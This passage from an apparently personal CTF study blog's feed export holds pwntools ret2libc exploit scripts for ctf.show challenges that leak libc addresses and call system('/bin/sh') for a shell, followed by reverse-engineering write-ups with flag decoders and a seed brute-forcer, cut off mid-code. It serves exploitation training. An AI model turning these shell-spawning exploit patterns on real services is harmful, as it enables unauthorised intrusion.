&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28141)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main = elf.sym[&#x27;main&#x27;]</span><br><span class="line">pop_rdi = 0x400803         </span><br><span class="line">pop_rsi_r15 = 0x400801     </span><br><span class="line"></span><br><span class="line">payload  = cyclic(0x70+8) + p64(pop_rdi) + p64(1)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(0)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line">write = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">print hex(write)</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write)</span><br><span class="line">libc_base = write - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = cyclic(0x70+8) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">io.sendlineafter(&quot;O.o?&quot;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ã€‚ã€‚</p><h2 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> from LibcSearcher import *</span><br><span class="line"> context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"> #io = process(&#x27;./pwn&#x27;)</span><br><span class="line"> io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28200)</span><br><span class="line"> elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"> io.recvuntil(&quot;puts: &quot;)</span><br><span class="line"> puts = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> io.recvuntil(&quot;gift: &quot;)</span><br><span class="line"> bin_sh = eval(io.recvuntil(&quot;\n&quot; , drop = True))</span><br><span class="line"> libc = LibcSearcher(&quot;puts&quot; , puts)</span><br><span class="line"> libc_base = puts - libc.dump(&quot;puts&quot;)</span><br><span class="line"> system = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"> paylad = &quot;a&quot;*(0x9c+4) + p32(system) + p32(0) + p32(bin_sh)</span><br><span class="line"> io.sendline(paylad)</span><br><span class="line"> io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-study&quot;&gt;&lt;a href=&quot;#PWN-study&quot; class=&quot;headerlink&quot; title=&quot;PWN-study&quot;&gt;&lt;/a&gt;PWN-study&lt;/h1&gt;&lt;h3 id=&quot;pwn0&quot;&gt;&lt;a href=&quot;#pwn0&quot; class=&quot;headerli</summary>
      
    
    
    
    
    <category term="CTF PWN" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-PWN/"/>
    
  </entry>
  
  <entry>
    <title>Reç™¾é¢˜è®¡åˆ’ï¼ˆ</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/05/04/Re%E7%99%BE%E9%A2%98%E8%AE%A1%E5%88%92%EF%BC%88/</id>
    <published>2024-05-03T16:00:00.000Z</published>
    <updated>2024-09-16T07:58:26.586Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Reç™¾é¢˜è®¡åˆ’ï¼ˆ"><a href="#Reç™¾é¢˜è®¡åˆ’ï¼ˆ" class="headerlink" title="Reç™¾é¢˜è®¡åˆ’ï¼ˆ"></a>Reç™¾é¢˜è®¡åˆ’ï¼ˆ</h1><h2 id="1-ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ"><a href="#1-ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ" class="headerlink" title="1.ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ"></a>1.ä½ æ˜¯çœŸçš„å¤§å­¦ç”Ÿå—ï¼Ÿ</h2><h5 id="ç¡¬è¯»æ±‡ç¼–"><a href="#ç¡¬è¯»æ±‡ç¼–" class="headerlink" title="ç¡¬è¯»æ±‡ç¼–"></a>ç¡¬è¯»æ±‡ç¼–</h5><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">start           proc near</span><br><span class="line">seg001:<span class="number">0000</span>                 mov     ax, seg dseg</span><br><span class="line">seg001:<span class="number">0003</span>                 mov     ds, ax</span><br><span class="line">seg001:<span class="number">0005</span>                 assume ds:dseg</span><br><span class="line">seg001:<span class="number">0005</span>                 lea     dx, unk_10000</span><br><span class="line">seg001:<span class="number">0009</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">000</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">000</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">000</span>D                 lea     dx, unk_1002D</span><br><span class="line">seg001:<span class="number">0011</span>                 mov     ah, <span class="number">0</span>Ah</span><br><span class="line">seg001:<span class="number">0013</span>                 int     <span class="number">21</span>h             ; DOS - BUFFERED KEYBOARD INPUT</span><br><span class="line">seg001:<span class="number">0013</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> buffer</span><br><span class="line">seg001:<span class="number">0015</span>                 lea     dx, unk_10010</span><br><span class="line">seg001:<span class="number">0019</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">001</span>B                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">001</span>B                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">001</span>D                 xor     cx, cx</span><br><span class="line">seg001:<span class="number">001</span>F                 xor     ax, ax</span><br><span class="line">seg001:<span class="number">0021</span>                 mov     cl, byte_1002E</span><br><span class="line">seg001:<span class="number">0025</span>                 mov     si, <span class="number">2</span>Fh ; <span class="string">&#x27;/&#x27;</span></span><br><span class="line">seg001:<span class="number">0028</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">002</span>A                 add     si, cx</span><br><span class="line">seg001:<span class="number">002</span>C</span><br><span class="line">seg001:<span class="number">002</span>C loc_1007C:                              ; CODE XREF: start+<span class="number">37</span>â†“j</span><br><span class="line">seg001:<span class="number">002</span>C                 sub     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">002</span>F                 xor     [si], al</span><br><span class="line">seg001:<span class="number">0031</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0033</span>                 dec     cx</span><br><span class="line">seg001:<span class="number">0034</span>                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0037</span>                 jnz     short loc_1007C</span><br><span class="line">seg001:<span class="number">0039</span>                 lea     si, unk_1002F</span><br><span class="line">seg001:<span class="number">003</span>D                 lea     di, unk_10019<span class="comment">///////</span></span><br><span class="line">seg001:<span class="number">0041</span></span><br><span class="line">seg001:<span class="number">0041</span> loc_10091:                              ; CODE XREF: start+<span class="number">50</span>â†“j</span><br><span class="line">seg001:<span class="number">0041</span>                 mov     al, [si]</span><br><span class="line">seg001:<span class="number">0043</span>                 mov     bl, [di]</span><br><span class="line">seg001:<span class="number">0045</span>                 add     si, <span class="number">1</span></span><br><span class="line">seg001:<span class="number">0048</span>                 inc     di</span><br><span class="line">seg001:<span class="number">0049</span>                 cmp     al, bl</span><br><span class="line">seg001:<span class="number">004</span>B                 jnz     short loc_100AA</span><br><span class="line">seg001:<span class="number">004</span>D                 cmp     cx, <span class="number">0</span></span><br><span class="line">seg001:<span class="number">0050</span>                 jnz     short loc_10091</span><br><span class="line">seg001:<span class="number">0052</span>                 lea     dx, unk_10013</span><br><span class="line">seg001:<span class="number">0056</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg001:<span class="number">0058</span>                 int     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg001:<span class="number">0058</span>                                         ; DS:DX <span class="punctuation">-&gt;</span> string terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg001:<span class="number">005</span>A</span><br><span class="line">seg001:<span class="number">005</span>A loc_100AA:                              ; CODE XREF: start+<span class="number">4</span>Bâ†‘j</span><br><span class="line">seg001:<span class="number">005</span>A                 mov     ah, <span class="number">4</span>Ch</span><br><span class="line">seg001:<span class="number">005</span>C                 int     <span class="number">21</span>h             ; DOS - <span class="number">2</span>+ - QUIT WITH EXIT <span class="title function_ invoke__">CODE</span> (EXIT)</span><br><span class="line">seg001:<span class="number">005</span>C start           endp                    ; AL = exit code</span><br><span class="line">seg001:<span class="number">005</span>C</span><br><span class="line">seg001:<span class="number">005</span>C seg001          ends</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰æ‰¾åˆ°å…¶ä»–æ–¹æ³•ï¼Œç¡¬è¯»æ±‡ç¼–qwq<br>è¾“å…¥â€”-æ¯ä¸€ä½ä¸åé¢ä¸€ä½å¼‚æˆ–â€”â€“ä¸dæ•°ç»„æ¯”å¯¹ã€‚<br>#çœ‹åˆ°è¯´æ˜¯å¾ªç¯å¼‚æˆ–</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428202306830.png" alt="image-20240428202306830"></p><p>è§£å¯†ï¼šï¼ˆæœ€åä¸€ä¸ªæ²¡å‡ºï¼Œä½†æ˜¯å¯èƒ½å’Œç¬¬ä¸€ä¸ªå¼‚æˆ–ï¼Ÿ</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">cipher[i] = cipher[i] ^ cipher[i + <span class="number">1</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="keyword">if</span> i != (<span class="built_in">len</span>(cipher) - <span class="number">1</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(cipher[i] ^ cipher[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;#åˆæ˜¯8086</span></span><br></pre></td></tr></table></figure><p>#æ”¾ä¸ª16ä½<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428204644536.png" alt="image-20240428204644536"></p><h2 id="2-Debugme"><a href="#2-Debugme" class="headerlink" title="2.Debugme"></a>2.Debugme</h2><h5 id="åŠ¨æ€è°ƒè¯•apk"><a href="#åŠ¨æ€è°ƒè¯•apk" class="headerlink" title="åŠ¨æ€è°ƒè¯•apk"></a>åŠ¨æ€è°ƒè¯•apk</h5><p>è¯´æ˜¯åŠ¨æ€è°ƒè¯•apk</p><blockquote><p><a href="http://t.csdnimg.cn/Xk9op">http://t.csdnimg.cn/Xk9op</a><br>1ã€jebæ‰“å¼€apkï¼Œåˆ†ææºç ï¼Œä¸‹å¥½æ–­ç‚¹ï¼›<br> 2ã€å¯åŠ¨æ¨¡æ‹Ÿå™¨ï¼Œå®‰è£…å¥½apkï¼›<br> 3ã€adbå‘½ä»¤è¿æ¥æ¨¡æ‹Ÿå™¨ï¼Œå¯åŠ¨apkï¼Œadb shell am start -D -n ï¼ˆåŒ…åï¼‰&#x2F;ï¼ˆ.ä¸»çª—ä½“ï¼‰<br> 4ã€jebé™„åŠ å¯¹åº”çš„è¿›ç¨‹ï¼Œå¼€å§‹æ„‰å¿«çš„è°ƒè¯•ã€‚</p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am <span class="built_in">start</span> -D -n com.xyctf.ezapk/.MainActivity</span><br></pre></td></tr></table></figure><h2 id="3-Trustme"><a href="#3-Trustme" class="headerlink" title="3.*Trustme"></a>3.*Trustme</h2><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>#æ”¾ä¸ªjadxæ”¯æŒçš„æ–‡ä»¶ç§ç±»ï¼šapkã€dexã€jarã€zipã€classã€aar</p><p><a href="http://t.csdnimg.cn/35N5aadb%E8%BF%9E%E6%8E%A5MuMu%E3%80%81%E9%80%8D%E9%81%A5%E3%80%81%E5%A4%9C%E7%A5%9E%E3%80%81%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%BB%A5%E5%8F%8A%E8%85%BE%E8%AE%AF%E6%89%8B%E6%B8%B8%E5%8A%A9%E6%89%8B%E4%BB%A5%E5%8F%8A%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5_%E9%9B%B7%E7%94%B5adb%E8%BF%9E%E6%8E%A5%E5%9C%B0%E5%9D%80-CSDN%E5%8D%9A%E5%AE%A2">http://t.csdnimg.cn/35N5aadbè¿æ¥MuMuã€é€é¥ã€å¤œç¥ã€é›·ç”µæ¨¡æ‹Ÿå™¨ä»¥åŠè…¾è®¯æ‰‹æ¸¸åŠ©æ‰‹ä»¥åŠæ–­å¼€è¿æ¥_é›·ç”µadbè¿æ¥åœ°å€-CSDNåšå®¢</a></p><p>ï¼Ÿæ”¾ä¸€ä¸‹</p><h2 id="4-ez-cube"><a href="#4-ez-cube" class="headerlink" title="4.ez_cube"></a>4.ez_cube</h2><h5 id="æ¨¡æ‹Ÿ-æ‹§é­”æ–¹ï¼Ÿ"><a href="#æ¨¡æ‹Ÿ-æ‹§é­”æ–¹ï¼Ÿ" class="headerlink" title="æ¨¡æ‹Ÿ+æ‹§é­”æ–¹ï¼Ÿ"></a>æ¨¡æ‹Ÿ+æ‹§é­”æ–¹ï¼Ÿ</h5><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222750041.png" alt="image-20240428222750041"></p><p>åˆ†åˆ«æ˜¯é¢é¢œè‰²â€“ç°åœ¨çŠ¶æ€â€“æ“ä½œè¡Œä¸º</p><p>#æ‹¿ç€é­”æ–¹æ‹§ä¸€ä¸‹</p><p>cmpå‡½æ•°æ˜¯éªŒè¯æ˜¯å¦å¤åŸï¼Œä»¥åŠå¤åŸæ­¥éª¤æ˜¯å¦&lt;&#x3D;12</p><p>æ‹¿é­”æ–¹æ‰‹æ“ï¼šRuRURURuruRR</p><h2 id="5-ä»Šå¤•æ˜¯ä½•å¹´"><a href="#5-ä»Šå¤•æ˜¯ä½•å¹´" class="headerlink" title="5.ä»Šå¤•æ˜¯ä½•å¹´"></a>5.ä»Šå¤•æ˜¯ä½•å¹´</h2><h5 id="é¾™èŠ¯loongarch"><a href="#é¾™èŠ¯loongarch" class="headerlink" title="é¾™èŠ¯loongarch"></a>é¾™èŠ¯loongarch</h5><p>#<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428222956978.png" alt="image-20240428222956978"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240428223006225.png" alt="image-20240428223006225"></p><h2 id="6-baby-unity"><a href="#6-baby-unity" class="headerlink" title="6.*baby unity"></a>6.*baby unity</h2><p>å¥½éš¾</p><h2 id="7-ez-rand"><a href="#7-ez-rand" class="headerlink" title="7.ez_rand"></a>7.ez_rand</h2><h5 id="éšæœºæ•°ç§å­"><a href="#éšæœºæ•°ç§å­" class="headerlink" title="éšæœºæ•°ç§å­"></a>éšæœºæ•°ç§å­</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v4; <span class="comment">// ax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  __int64 v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9[<span class="number">7</span>]; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+3Ch] [rbp-34h]</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+3Dh] [rbp-33h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int16 v15; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+5Eh] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  sub_140001020(<span class="string">&quot;è¯·è¾“å…¥flag:&quot;</span>);</span><br><span class="line">  sub_140001080(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0xEA6C0C5D</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">-1</span>i64;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0x34FC1946</span>;</span><br><span class="line">  v9[<span class="number">2</span>] = <span class="number">0x72362B2</span>;</span><br><span class="line">  v9[<span class="number">3</span>] = <span class="number">0xFB6E2262</span>;</span><br><span class="line">  v9[<span class="number">4</span>] = <span class="number">0xA9F2E8B4</span>;</span><br><span class="line">  v9[<span class="number">5</span>] = <span class="number">0x86211291</span>;</span><br><span class="line">  v9[<span class="number">6</span>] = <span class="number">0x43E98EDB</span>;</span><br><span class="line">  v10 = <span class="number">77</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v3;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;v12 + v3) );</span><br><span class="line">  v4 = time64(<span class="number">0</span>i64);</span><br><span class="line">  srand(v4);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = rand();</span><br><span class="line">      <span class="keyword">if</span> ( (*((_BYTE *)&amp;v12 + v6) ^ (<span class="type">unsigned</span> __int8)(v7</span><br><span class="line">                                                    + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>i64)</span><br><span class="line">                                                    + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span>i64 * v7) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>))) != *((_BYTE *)v9 + v6) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_140001020(<span class="string">&quot;Error???\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ++v5;</span><br><span class="line">      ++v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; v3 );</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001020(<span class="string">&quot;Right???\n&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v4æ˜¯ç§å­ï¼Œsrandå‡½æ•°å’Œrandå‡½æ•°æ ¹æ®ç§å­æ¥ç”Ÿæˆéšæœºæ•°ï¼ŒinputåŠ å¯†é€»è¾‘ä½¿ç”¨v7</p><p>é‚£ä¹ˆé¦–å…ˆæƒ³åˆ°çš„æ˜¯çˆ†ç ´ç§å­ï¼Œæ¥æ¨flag</p><p>å†çœ‹v4ï¼Œ<strong>unsigned __int16 v4</strong>æ— ç¬¦å·16ä½æ•´æ•°å‹ï¼Œv4èŒƒå›´ä¸º0~2**16-1(65535)ï¼Œç»“åˆflagå›ºå®šæ ¼å¼</p><p>XYCTF{}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">containsXYCTF</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strstr</span>(str, <span class="string">&quot;XYCTF&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// åŒ…å«&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// ä¸åŒ…å«&quot;XYCTF&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[<span class="number">29</span>] = &#123;<span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>, <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>,</span><br><span class="line"><span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> v7;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">29</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> seed = <span class="number">0</span>; seed &lt; <span class="number">65536</span>; seed++)</span><br><span class="line">&#123;</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v7 = rand();</span><br><span class="line"><span class="type">int</span> num = (<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * v7) &gt;&gt; <span class="number">32</span>);</span><br><span class="line"><span class="type">unsigned</span> __int8 data = (<span class="type">unsigned</span> __int8)(v7 + ((num &amp; <span class="number">0x80000000</span>) !=</span><br><span class="line"><span class="number">0</span>) + (num &gt;&gt; <span class="number">7</span>));</span><br><span class="line">flag[i] = cipher[i] ^ data;</span><br><span 